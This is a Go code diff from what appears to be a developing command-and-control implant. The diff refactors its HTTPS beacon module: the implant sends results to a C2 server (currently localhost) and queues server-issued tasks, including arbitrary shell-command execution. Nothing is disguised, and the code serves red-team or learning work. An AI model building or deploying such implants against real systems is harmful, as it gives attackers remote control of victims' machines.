@@ -1,6 +1,7 @@
 package c2communicator
 
 import (
+	"asritha.dev/implant/pkg/task"
 	"bytes"
 	"crypto/sha256"
 	"crypto/tls"
@@ -10,6 +11,13 @@ import (
 	"fmt"
 	"net/http"
 	"time"
+)
+
+const (
+	// TODO: these should be passed in form main when initalizing HTTPSCommun or smthign
+	// TODO: would use the same DOMAIN for HTTPS + DNS -> rename to these consts to be idiomatic (see above)
+	C2HTTPSURI            = "https://localhost"
+	C2HTTPSBEACONENDPOINT = "/implant/beacon"
 )
 
 type HTTPSC2TaskRequest struct {
@@ -66,12 +74,12 @@ func NewHTTPSC2Communicator() *HTTPSC2Communicator {
 }
 
 type BeaconPayload struct {
-	ImplantID uint     `json:"implant-id"`
-	Results   []Result `json:"results"`
+	ImplantID uint          `json:"implant-id"`
+	Results   []task.Result `json:"results"`
 }
 
 // Beacon sends results and returns the next TaskQueue
-func (h *HTTPSC2Communicator) Beacon(implantID uint, results []Result) (*TaskQueue, error) {
+func (h *HTTPSC2Communicator) Beacon(implantID uint, results []task.Result) (*task.TaskQueue, error) {
 	// 1. Marshal results
 	payload := BeaconPayload{
 		ImplantID: implantID, // TODO: fix so that it uses JWT so its more secure
@@ -106,11 +114,11 @@ func (h *HTTPSC2Communicator) Beacon(implantID uint, results []Result) (*TaskQue
 	}
 
 	// 5. Enqueue tasks
-	tq := NewTaskQueue()
+	tq := task.NewTaskQueue()
 	for _, t := range c2Tasks {
 		switch t.TaskType {
 		case "Ping":
-			tq.Enqueue(NewPingTask(t.ID))
+			tq.Enqueue(task.NewPing(t.ID))
 		case "Command": // TODO: make this ShellCommand for consistent naming?
 			// TODO: CHECKOVER
 			raw, ok := t.Options["commandWithArgs"]
@@ -130,7 +138,7 @@ func (h *HTTPSC2Communicator) Beacon(implantID uint, results []Result) (*TaskQue
 					cmd[i] = s
 				}
 			}
-			tq.Enqueue(NewShellCommandTask(t.ID, cmd))
+			tq.Enqueue(task.NewShellCommand(t.ID, cmd))
 
 		}
 	}
